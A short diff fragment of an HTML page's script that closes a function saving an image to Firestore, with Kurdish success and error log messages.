+                console.log("وێنەکە پاشەکەوت کرا.");
+            } catch (e) {
+                console.error("کێشە لە ناردنی داتا بۆ Firestore: ", e);
+            }
+        }
     </script>
 </body>
 </html>
